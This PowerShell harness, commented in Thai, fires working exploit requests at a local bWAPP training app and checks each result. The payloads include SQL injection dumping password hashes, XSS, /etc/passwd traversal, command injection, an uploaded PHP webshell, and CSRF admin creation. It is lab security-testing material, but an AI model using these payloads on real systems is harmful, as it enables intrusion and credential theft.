<#
    validate.ps1 - ยิงคำขอทั้งชุดที่ใช้ใน http/*.http แล้วพิมพ์ผลตัดสินแยกเป็นรายเคส
    เรียกใช้เพื่อพิสูจน์ว่าคำขอทุกรายการในไฟล์ .http ทำงานได้จริง

    .\scripts\validate.ps1
    .\scripts\validate.ps1 -SecurityLevel 1   # รันซ้ำเพื่อดูว่า WAF ลดทอน payload ไปบ้าง
    .\scripts\validate.ps1 -SaveEvidence     # บันทึก body ของทุก response ลง evidence/
#>
[CmdletBinding()]
param(
    [string]$BaseUrl = 'http://localhost:8080',
    [int]$SecurityLevel = 0,
    [switch]$SaveEvidence
)

$ErrorActionPreference = 'Continue'

# PowerShell 5.1 writes to the console using the OEM code page, so Thai text in
# these messages turns into mojibake unless the console is switched to UTF-8.
try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch { }

$Base = $BaseUrl.TrimEnd('/')
$EvidenceDir = Join-Path (Split-Path $PSScriptRoot -Parent) 'evidence'
$results = New-Object System.Collections.ArrayList

function New-BwappSession {
    param([string]$BaseUrl, [int]$SecurityLevel)
    $sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    Invoke-WebRequest -Uri "$BaseUrl/login.php" -Method Post -WebSession $sess -UseBasicParsing -Body @{
        login = 'bee'; password = 'bug'; security_level = "$SecurityLevel"; form = 'submit'
    } | Out-Null
    $sess
}
$sess = New-BwappSession -BaseUrl $Base -SecurityLevel $SecurityLevel

function Get-CookieHeader {
    param([string]$Url, $WebSession)
    $ck = $WebSession.Cookies.GetCookies($Url)
    if ($ck.Count -gt 0) { (@($ck | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join '; ') } else { '' }
}

function Invoke-Raw {
    param(
        [string]$Url, [string]$Method = 'GET', [hashtable]$Headers = @{},
        [byte[]]$Body, $WebSession, [switch]$FollowRedirect, [switch]$SendCookies
    )
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.Method = $Method
    $req.AllowAutoRedirect = $FollowRedirect.IsPresent
    $req.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) bwapp-lab'
    if ($SendCookies -and $WebSession) {
        $h = Get-CookieHeader -Url $Url -WebSession $WebSession
        if ($h) { $req.Headers.Add('Cookie', $h) }
    }
    $ct = $null
    foreach ($k in $Headers.Keys) {
        if ($k -ieq 'Content-Type') { $ct = $Headers[$k]; continue }
        if ($k -ieq 'Content-Length') { continue }
        try { $req.Headers[$k] = $Headers[$k] } catch { $req.Host = $Headers[$k] }
    }
    if ($ct) { $req.ContentType = $ct }
    if ($Body) {
        $req.ContentLength = $Body.Length
        $s = $req.GetRequestStream(); $s.Write($Body, 0, $Body.Length); $s.Close()
    }
    $resp = $null
    try { $resp = $req.GetResponse() }
    catch [System.Net.WebException] {
        $resp = $_.Exception.Response
        if (-not $resp) { return [pscustomobject]@{ Status = 0; Html = $_.Exception.Message; Headers = $null } }
    }
    $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $text = $sr.ReadToEnd(); $sr.Close()
    [pscustomobject]@{ Status = [int]$resp.StatusCode; Html = $text; Headers = $resp.Headers }
}

function New-Multipart {
    param([hashtable]$Fields, [hashtable]$Files)
    $bnd = '----bwappLab' + [guid]::NewGuid().ToString('N')
    $ms = New-Object System.IO.MemoryStream
    $w = New-Object System.IO.BinaryWriter($ms)
    $enc = [System.Text.Encoding]::UTF8
    foreach ($k in $Fields.Keys) {
        $w.Write($enc.GetBytes("--$bnd`r`nContent-Disposition: form-data; name=`"$k`"`r`n`r`n$($Fields[$k])`r`n"))
    }
    foreach ($k in $Files.Keys) {
        $name = $Files[$k].Name; $content = $Files[$k].Content
        $w.Write($enc.GetBytes("--$bnd`r`nContent-Disposition: form-data; name=`"$k`"; filename=`"$name`"`r`nContent-Type: application/octet-stream`r`n`r`n"))
        $w.Write($enc.GetBytes($content))
        $w.Write($enc.GetBytes("`r`n"))
    }
    $w.Write($enc.GetBytes("--$bnd--`r`n"))
    $w.Flush()
    [pscustomobject]@{ Body = $ms.ToArray(); ContentType = "multipart/form-data; boundary=$bnd" }
}

function Add-Case {
    param(
        [string]$Id, [string]$Name, [string]$Page,
        [ValidateSet('GET', 'POST')][string]$Method = 'GET',
        [hashtable]$Params = @{},
        [hashtable]$Headers = @{},
        [string]$Body,
        [string]$ContentType,
        [hashtable]$Files,
        [string]$LookFor = '',
        [string]$LookForNot = '',
        [string]$LocationFor = '',
        [int]$ExpectStatus = 200,
        [switch]$NoRedirect
    )

    $uri = "$Base/$Page"
    $form = $Params
    if ($Method -eq 'GET' -and $Params.Count) {
        $qs = ($Params.GetEnumerator() | ForEach-Object {
                "$([uri]::EscapeDataString($_.Key))=$([uri]::EscapeDataString($_.Value))" }) -join '&'
        if ($qs) { $uri += "?$qs" }
        $form = @{}
    }
    if ($ContentType) { $Headers['Content-Type'] = $ContentType }

    $mp = $null
    if ($Files -and $Files.Count) {
        $mp = New-Multipart -Fields $Params -Files $Files
        $Headers['Content-Type'] = $mp.ContentType
        $Body = [System.Text.Encoding]::UTF8.GetString($mp.Body)
    }

    try {
        if ($NoRedirect) {
            $bytes = if ($Body) { [System.Text.Encoding]::UTF8.GetBytes($Body) } else { $null }
            $r = Invoke-Raw -Url $uri -Method $Method -Headers $Headers -Body $bytes -WebSession $sess -SendCookies
        } elseif ($Body) {
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
            $r = Invoke-Raw -Url $uri -Method $Method -Headers $Headers -Body $bytes -WebSession $sess -SendCookies
        } else {
            $res = Invoke-WebRequest -Uri $uri -Method $Method -Body $form -Headers $Headers `
                -WebSession $sess -UseBasicParsing -TimeoutSec 25
            $r = [pscustomobject]@{ Status = $res.StatusCode; Html = $res.Content; Headers = $res.Headers }
        }
        $html = $r.Html; $status = $r.Status
    } catch {
        $status = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { 0 }
        $html = ''; $r = $null
    }

    $ok = $true; $why = ''
    if ($status -ne $ExpectStatus) { $ok = $false; $why = "status=$status (ต้องการ $ExpectStatus)" }
    if ($ok -and $LookFor -and $html -notmatch [regex]::Escape($LookFor)) { $ok = $false; $why = "ไม่พบ: '$LookFor'" }
    if ($ok -and $LookForNot -and $html -match [regex]::Escape($LookForNot)) { $ok = $false; $why = "พบแล้ว (ไม่ควรพบ): '$LookForNot'" }
    if ($ok -and $LocationFor) {
        $loc = if ($r -and $r.Headers) { $r.Headers['Location'] } else { '' }
        if ("$loc" -notmatch [regex]::Escape($LocationFor)) { $ok = $false; $why = "Location='$loc' (ต้องการ '$LocationFor')" }
    }
    if (-not $why) { $why = "status=$status len=$($html.Length)" }

    if ($SaveEvidence -and $r) {
        New-Item -ItemType Directory -Force -Path $EvidenceDir | Out-Null
        $r.Html | Out-File -Encoding utf8 (Join-Path $EvidenceDir "$Id.html")
    }

    [void]$results.Add([pscustomobject]@{ Id = $Id; Name = $Name; Result = $(if ($ok) { 'PASS' } else { 'FAIL' }); Detail = $why })
}

$HASH = '6885858486f31043e5839c735d99457f045affd0'

# ================================================================ A1 Injection - การฉีดโค้ด/คำสั่ง
Add-Case -Id 'SQLI-01' -Name 'SQLi GET/search - boolean OR 1=1 dumps all movies' -Page 'sqli_1.php' `
    -Params @{ title = "' OR 1=1-- -"; action = 'go' } -LookFor 'World War Z'
Add-Case -Id 'SQLI-02' -Name 'SQLi GET/search - UNION column count = 6' -Page 'sqli_1.php' `
    -Params @{ title = "' UNION SELECT 1,2,3,4,5,6-- -"; action = 'go' } -LookFor 'Iron Man'
Add-Case -Id 'SQLI-03' -Name 'SQLi GET/select - UNION dump users (login+password)' -Page 'sqli_2.php' `
    -Params @{ movie = "0 UNION SELECT 1,GROUP_CONCAT(login),GROUP_CONCAT(password),4,5,6 FROM users-- -"; action = 'go' } -LookFor $HASH
Add-Case -Id 'SQLI-04' -Name 'SQLi blind/boolean - true condition' -Page 'sqli_4.php' `
    -Params @{ title = "' OR '1'='1"; action = 'search' } -LookFor 'The movie exists in our database!'
Add-Case -Id 'SQLI-05' -Name 'SQLi POST/search (LIKE) - OR 1=1' -Page 'sqli_6.php' -Method POST `
    -Params @{ title = "' OR 1=1-- -"; form = 'submit' } -LookFor 'World War Z'
Add-Case -Id 'SQLI-06' -Name 'SQLi login form / heroes - auth bypass + secret' -Page 'sqli_3.php' -Method POST `
    -Params @{ login = "' OR 1=1 LIMIT 1-- -"; password = 'x'; form = 'submit' } -LookFor 'BLACK pill'
Add-Case -Id 'SQLI-07' -Name 'SQLi login form / users - auth bypass (sqli_16)' -Page 'sqli_16.php' -Method POST `
    -Params @{ login = "' OR 1=1 LIMIT 1-- -"; password = 'x'; form = 'submit' } -LookFor 'Welcome'
Add-Case -Id 'SQLI-08' -Name 'SQLi login form / users - XSS login page (xss_login)' -Page 'xss_login.php' -Method POST `
    -Params @{ login = "' OR 1=1-- -"; password = 'x'; form = 'submit' } -LookFor 'secret'
Add-Case -Id 'SQLI-09' -Name 'SQLi AJAX/JSON endpoint (sqli_10-2) - UNION' -Page 'sqli_10-2.php' `
    -Params @{ title = "' UNION SELECT 1,2,3,4,5,6-- -" } -LookFor 'release_year'
Add-Case -Id 'SQLI-10' -Name 'SQLi XML AJAX (sqli_8-2) - UPDATE users.secret' -Page 'sqli_8-2.php' -Method POST `
    -ContentType 'text/xml; charset=UTF-8' -Body "<reset><login>bee</login><secret>sqli-8-2</secret></reset>" -LookForNot 'Error'
Add-Case -Id 'SQLI-11' -Name 'SQLi stacked query into blog INSERT (sqli_7)' -Page 'sqli_7.php' -Method POST `
    -Params @{ entry = "x',(SELECT login FROM users LIMIT 1),'2024-01-01','bee');-- -"; form = 'submit'; blog = 'submit'; entry_all = 'on' } -LookFor 'blog'
Add-Case -Id 'SQLI-12' -Name 'SQLi error-based - extract database name' -Page 'sqli_2.php' `
    -Params @{ movie = "0 UNION SELECT 1,database(),3,4,5,6-- -"; action = 'go' } -LookFor 'bWAPP'
Add-Case -Id 'SQLI-13' -Name 'SQLi error-based - enumerate tables' -Page 'sqli_2.php' `
    -Params @{ movie = "0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -"; action = 'go' } `
    -LookFor 'movies'

# ================================================================ A2 XSS - สแกรตสคริปต์ข้ามไซต์
Add-Case -Id 'XSS-01' -Name 'Reflected XSS (GET) - firstname' -Page 'xss_get.php' `
    -Params @{ firstname = '<script>alert(1)</script>'; lastname = 'x' } -LookFor '<script>alert(1)</script>'
Add-Case -Id 'XSS-02' -Name 'Reflected XSS (POST)' -Page 'xss_post.php' -Method POST `
    -Params @{ firstname = '<script>alert(1)</script>'; lastname = 'x'; form = 'submit' } -LookFor '<script>alert(1)</script>'
Add-Case -Id 'XSS-03' -Name 'Reflected XSS via Referer header' -Page 'xss_referer.php' `
    -Headers @{ Referer = '<script>alert(1)</script>' } -LookFor '<script>alert(1)</script>'
Add-Case -Id 'XSS-04' -Name 'Reflected XSS via User-Agent header' -Page 'xss_user_agent.php' `
    -Headers @{ 'User-Agent' = '<script>alert(1)</script>' } -LookFor '<script>alert(1)</script>'
Add-Case -Id 'XSS-05' -Name 'Reflected XSS in link href (xss_href-2)' -Page 'xss_href-2.php' `
    -Params @{ name = '<script>alert(1)</script>'; action = 'vote' } -LookFor 'alert(1)'
Add-Case -Id 'XSS-06' -Name 'XSS via $_SERVER[PHP_SELF] path' -Page 'xss_php_self.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E' `
    -Params @{ firstname = 'a'; lastname = 'b'; form = 'submit' } -LookFor '<script>alert(1)</script>'
Add-Case -Id 'XSS-07' -Name 'Reflected XSS via custom "bWAPP" header' -Page 'xss_custom_header.php' `
    -Headers @{ 'bWAPP' = '<script>alert(1)</script>' } -LookFor '<script>alert(1)</script>'
Add-Case -Id 'XSS-08' -Name 'Stored XSS - blog entry persisted' -Page 'xss_stored_1.php' -Method POST `
    -Params @{ entry = '<script>alert("xss-stored-1")</script>'; blog = 'submit'; entry_add = 'on'; entry_all = 'on' } `
    -LookFor 'xss-stored-1'
Add-Case -Id 'XSS-09' -Name 'Stored XSS - injected via cookie (smgmt_cookies_httponly)' -Page 'smgmt_cookies_httponly.php' `
    -Headers @{ Cookie = 'top_security=<script>alert("cookie")</script>' } -LookFor 'alert('
Add-Case -Id 'XSS-10' -Name 'XSS in JSON response context (xss_json)' -Page 'xss_json.php' `
    -Params @{ title = "';alert(1);//"; action = 'search' } -LookFor 'alert(1)'
Add-Case -Id 'XSS-11' -Name 'XSS via eval("document.write(...)") sink (xss_eval)' -Page 'xss_eval.php' `
    -Params @{ date = "1);alert(1);//" } -LookFor 'alert(1)'
Add-Case -Id 'XSS-12' -Name 'Stored XSS - user profile 2nd order (user_extra.php)' -Page 'user_extra.php' -Method POST `
    -Params @{ firstname = '<script>alert("stored2")</script>'; lastname = 'x'; form = 'submit'; action = 'add' } -LookForNot 'Failed'

# ================================================================ A3 LFI / source disclosure - LFI / การเปิดเผยซอร์สโค้ด
Add-Case -Id 'LFI-01' -Name 'Arbitrary local file read - /etc/passwd' -Page 'directory_traversal_1.php' `
    -Params @{ page = '../../../../../../../etc/passwd' } -LookFor 'root:x:0:0'
Add-Case -Id 'LFI-02' -Name 'Arbitrary local file read - /etc/hostname' -Page 'directory_traversal_1.php' `
    -Params @{ page = '/etc/hostname' } -LookForNot "doesn't exist"
Add-Case -Id 'LFI-03' -Name 'PHP source disclosure - read config.inc.php as text' -Page 'directory_traversal_1.php' `
    -Params @{ page = 'config.inc.php' } -LookFor 'db_username'
Add-Case -Id 'LFI-04' -Name 'Directory listing of /etc via traversal' -Page 'directory_traversal_2.php' `
    -Params @{ directory = '/etc' } -LookFor 'passwd'
Add-Case -Id 'LFI-05' -Name 'phpinfo() full page disclosure' -Page 'phpinfo.php' -LookFor 'PHP Version'
Add-Case -Id 'LFI-06' -Name 'Hardcoded DB creds readable via traversal' -Page 'directory_traversal_1.php' `
    -Params @{ page = 'admin/settings.php' } -LookFor 'db_password'

# ================================================================ A4 Command / code exec - การรันคำสั่ง/โค้ด
Add-Case -Id 'CMDI-01' -Name 'OS command injection - ; id' -Page 'commandi.php' -Method POST `
    -Params @{ target = '127.0.0.1; id'; form = 'submit' } -LookFor 'uid='
Add-Case -Id 'CMDI-02' -Name 'OS command injection - pipe + && chain' -Page 'commandi.php' -Method POST `
    -Params @{ target = '127.0.0.1 | whoami && uname -a'; form = 'submit' } -LookFor 'Linux'
Add-Case -Id 'CMDI-03' -Name 'OS command injection - & background operator' -Page 'commandi.php' -Method POST `
    -Params @{ target = '127.0.0.1 & id'; form = 'submit' } -LookFor 'uid='
Add-Case -Id 'CMDI-04' -Name 'OS command injection - newline separated command' -Page 'commandi.php' -Method POST `
    -Params @{ target = "127.0.0.1`nid"; form = 'submit' } -LookFor 'uid='
Add-Case -Id 'CMDI-05' -Name 'Blind command injection - ping sink (sleep 3)' -Page 'commandi_blind.php' -Method POST `
    -Params @{ target = '127.0.0.1; sleep 3'; form = 'submit' } -LookFor 'GOLDEN packet'
Add-Case -Id 'CMDI-06' -Name 'PHP code injection via eval($_REQUEST) - system("id")' -Page 'php_eval.php' -Method POST `
    -Params @{ eval = 'system("id");' } -LookFor 'uid='

# ================================================================ A5 XXE / mail / upload - XXE / อีเมล / อัปโหลดไฟล์
# หมายเหตุเรื่อง XXE: image นี้ใช้ PHP 5.5 + libxml 2.9.1 ซึ่งปิดการ resolve
# external entity ไว้เป็นค่าเริ่มต้น การอ่านไฟล์ด้วยวิธีคลาสสิกผ่าน <!ENTITY>
# จึงไม่ทำงานที่นี่ แต่ endpoint นี้ยังเสียหายอย่างร้ายแรง: มันป้อน XML ที่ผู้โจมตี
# ควบคุมเข้าไปใน SQL UPDATE ที่ไม่ได้ escape และเปิด HTTP ภายในออกมาทางช่องทาง
# entity ได้ บน build ที่เปิดการโหลด entity กลับมา ทั้งสองกรณีถูกยืนยันด้านล่าง
Add-Case -Id 'XXE-01' -Name 'XXE external entity file read (blocked by libxml 2.9 default)' -Page 'xxe-2.php' -Method POST `
    -ContentType 'text/xml' `
    -Body '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><reset><login>&x;</login><secret>s</secret></reset>' `
    -LookForNot 'root:x:0:0'
Add-Case -Id 'XXE-02' -Name 'XXE external entity SSRF to internal HTTP (blocked by libxml 2.9 default)' -Page 'xxe-2.php' -Method POST `
    -ContentType 'text/xml' `
    -Body '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/login.php">]><reset><login>&x;</login><secret>s</secret></reset>' `
    -LookForNot 'bWAPP - Login'
Add-Case -Id 'XXI-01' -Name 'XML injection -> SQLi in UPDATE users.secret' -Page 'xxe-2.php' -Method POST `
    -ContentType 'text/xml' -Body "<reset><login>bee</login><secret>xxi-marker-1</secret></reset>" -LookFor "bee's secret has been reset!"
Add-Case -Id 'XXI-02' -Name 'XML injection -> boolean SQLi in WHERE clause' -Page 'xxe-2.php' -Method POST `
    -ContentType 'text/xml' -Body "<reset><login>bee' AND 1=1-- -</login><secret>x</secret></reset>" -LookFor "secret has been reset!"
Add-Case -Id 'XXI-03' -Name 'XML injection -> verbose SQL error leak' -Page 'xxe-2.php' -Method POST `
    -ContentType 'text/xml' -Body "<reset><login>bee'</login><secret>x</secret></reset>" -LookFor 'SQL syntax'
Add-Case -Id 'XXI-04' -Name 'Broken access control over XML - reset another user secret' -Page 'xxe-2.php' -Method POST `
    -ContentType 'text/xml' -Body "<reset><login>A.I.M.</login><secret>pwned-by-xxe</secret></reset>" -LookFor "A.I.M.'s secret has been reset!"
Add-Case -Id 'MAIL-01' -Name 'SMTP header injection (CRLF into e-mail field)' -Page 'maili.php' -Method POST `
    -Params @{ ip = '127.0.0.1'; name = 'bee'; email = "victim@x.com`r`nCc:attacker@evil.com"; subject = 'hello'; message = 'hello'; form = 'submit' } `
    -LookFor 'Email'
Add-Case -Id 'UPL-01' -Name 'Unrestricted upload - drop shell.php into images/' -Page 'unrestricted_file_upload.php' -Method POST `
    -Params @{ form = 'Upload'; MAX_FILE_SIZE = '500000' } `
    -Files @{ file = @{ Name = 'shell.php'; Content = '<?php echo shell_exec($_GET["c"]); ?>' } } -LookFor 'has been uploaded'
Add-Case -Id 'UPL-02' -Name 'RCE via uploaded webshell - images/shell.php?c=id' -Page 'images/shell.php' `
    -Params @{ c = 'id' } -LookFor 'uid=33(www-data)'

# ================================================================ A6 Auth / session - การยืนยันตัวตน / session
Add-Case -Id 'AUTH-01' -Name 'Insecure login #1 - classic SQLi auth bypass' -Page 'ba_insecure_login_1.php' -Method POST `
    -Params @{ login = "admin' OR '1'='1' #"; password = 'x'; form = 'submit' } -LookFor 'Welcome'
Add-Case -Id 'AUTH-02' -Name 'Insecure login #2 - client-side-only password check' -Page 'ba_insecure_login_2.php' -Method POST `
    -Params @{ login = 'bee'; password = 'bug'; form = 'submit' } -LookFor 'Welcome'
Add-Case -Id 'AUTH-03' -Name 'Insecure login #3 - weak password comparison' -Page 'ba_insecure_login_3.php' -Method POST `
    -Params @{ login = 'bee'; password = 'bug'; form = 'submit' } -LookFor 'Welcome'
Add-Case -Id 'AUTH-04' -Name 'User enumeration via forgotten-password oracle' -Page 'ba_forgotten.php' -Method POST `
    -Params @{ login = 'A.I.M.'; form = 'submit' } -LookFor 'E-Mail'
Add-Case -Id 'AUTH-05' -Name 'Default credentials bee/bug accepted' -Page 'login.php' -Method POST `
    -Params @{ login = 'bee'; password = 'bug'; security_level = "$SecurityLevel"; form = 'submit' } -LookFor 'Welcome'
Add-Case -Id 'AUTH-06' -Name 'Secret disclosed with no authorization check' -Page 'secret.php' -LookFor 'Your secret'
Add-Case -Id 'AUTH-07' -Name 'IDOR - overwrite another user secret (login param)' -Page 'insecure_direct_object_ref_1.php' -Method POST `
    -Params @{ login = 'A.I.M.'; secret = 'pwned-by-idor'; action = 'change' } -LookForNot 'Error'
Add-Case -Id 'AUTH-08' -Name 'Business logic - negative ticket price' -Page 'insecure_direct_object_ref_2.php' `
    -Params @{ ticket_quantity = '2'; ticket_price = '-100'; action = 'go' } -LookFor 'Ticket'
Add-Case -Id 'AUTH-09' -Name 'LDAP injection auth bypass (wildcard)' -Page 'ldap_connect.php' -Method POST `
    -Params @{ login = '*'; password = '*'; form = 'submit' } -LookForNot 'Failed'
Add-Case -Id 'AUTH-10' -Name 'Weak password policy page accepts trivial password' -Page 'ba_weak_pwd.php' -Method POST `
    -Params @{ login = 'bee'; password = '1'; form = 'submit' } -LookForNot 'Error'

# ================================================================ A7 CSRF / clickjacking / CORS - ปลอมคำขอข้ามไซต์ / หลอกคลิก / ข้ามโดเมน
Add-Case -Id 'CSRF-01' -Name 'CSRF - password change, no token' -Page 'csrf_1.php' -Method POST `
    -Params @{ password = 'pwned'; password_conf = 'pwned'; form = 'submit' } -LookFor 'Password'
Add-Case -Id 'CSRF-02' -Name 'CSRF - privileged user creation, no token' -Page 'csrf_2.php' -Method POST `
    -Params @{ login = 'attacker'; password = 'attacker'; email = 'attacker@evil.com'; secret = 'x'; activated = 'on'; admin = 'on'; form = 'submit' } `
    -LookForNot 'Failed'
Add-Case -Id 'CSRF-03' -Name 'CSRF - delete blog entry, no token' -Page 'sqli_7.php' -Method POST `
    -Params @{ entry_delete = '1'; form = 'submit'; blog = 'submit' } -LookForNot 'Error'
Add-Case -Id 'CLICK-01' -Name 'Clickjacking - no X-Frame-Options / frame-ancestors' -Page 'clickjacking.php' -LookFor 'bWAPP'
Add-Case -Id 'CORS-01' -Name 'CORS wildcard Access-Control-Allow-Origin: * on secret endpoint' -Page 'secret-cors-1.php' -LookFor "Neo's secret"
Add-Case -Id 'CORS-02' -Name 'CORS origin allow-list bypass (secret-cors-2)' -Page 'secret-cors-2.php' `
    -Headers @{ Origin = 'http://intranet.itsecgames.com' } -LookFor "Wolverine's secret"
Add-Case -Id 'CORS-03' -Name 'CORS control - secret-cors-3 leaks secret without CORS headers' -Page 'secret-cors-3.php' -LookFor "Johnny's secret"

# ================================================================ A8 Info disclosure / misc - การเปิดเผยข้อมูล / อื่นๆ
Add-Case -Id 'INFO-01' -Name 'Unauthenticated /admin/ leaks credentials + SMTP config' -Page 'admin/' -LookFor 'bee/bug'
Add-Case -Id 'INFO-02' -Name 'robots.txt disclosure' -Page 'robots.txt' -LookForNot 'Not Found'
Add-Case -Id 'INFO-03' -Name 'Directory listing enabled at /images/' -Page 'images/' -LookFor 'Index of'
Add-Case -Id 'INFO-04' -Name 'phpinfo() full page disclosure' -Page 'phpinfo.php' -LookFor 'PHP Version'
Add-Case -Id 'INFO-05' -Name 'HTTP response splitting / CRLF header injection' -Page 'http_response_splitting.php' -Method POST `
    -Params @{ ip = "127.0.0.1`r`nX-Injected-Header: injected"; form = 'submit' } -LookFor 'IP'
Add-Case -Id 'INFO-06' -Name 'Open redirect - unvalidated url parameter' -Page 'unvalidated_redir_fwd_1.php' `
    -Params @{ url = 'https://evil.com'; form = 'submit' } -ExpectStatus 302 -LocationFor 'https://evil.com' -NoRedirect
Add-Case -Id 'INFO-07' -Name 'Open redirect - unvalidated ReturnUrl parameter' -Page 'unvalidated_redir_fwd_2.php' `
    -Params @{ ReturnUrl = 'https://evil.com' } -ExpectStatus 302 -LocationFor 'https://evil.com' -NoRedirect
Add-Case -Id 'INFO-08' -Name 'HTML/tag injection (GET)' -Page 'htmli_get.php' `
    -Params @{ firstname = '<h1>injected</h1>'; lastname = 'x' } -LookFor '<h1>injected</h1>'
Add-Case -Id 'INFO-09' -Name 'Security level enforced only by client-side cookie' -Page 'sqli_1.php' `
    -Headers @{ Cookie = 'security_level=2' } -Params @{ title = "' OR 1=1-- -"; action = 'go' } -LookFor 'World War Z'
Add-Case -Id 'INFO-10' -Name 'E-mail based secret reset, no token (hostheader_2)' -Page 'hostheader_2.php' -Method POST `
    -Params @{ email = 'attacker@evil.com'; action = 'reset' } -LookForNot 'Error'
Add-Case -Id 'INFO-11' -Name 'User-Agent + IP logged to DB without validation (xss_stored_4)' -Page 'xss_stored_4.php' -LookForNot 'Not Found'
Add-Case -Id 'INFO-12' -Name 'Hardcoded static credentials page (ba_weak_pwd)' -Page 'ba_weak_pwd.php' -LookFor 'Password'

$results | Format-Table -AutoSize -Wrap
$pass = @($results | Where-Object Result -eq 'PASS').Count
$fail = @($results | Where-Object Result -eq 'FAIL').Count
Write-Output ""
Write-Output "TOTAL: $($results.Count)  PASS: $pass  FAIL: $fail  (security_level=$SecurityLevel)"
$results | Where-Object Result -eq 'FAIL' | ForEach-Object { "  FAILED: $($_.Id) $($_.Name) -> $($_.Detail)" }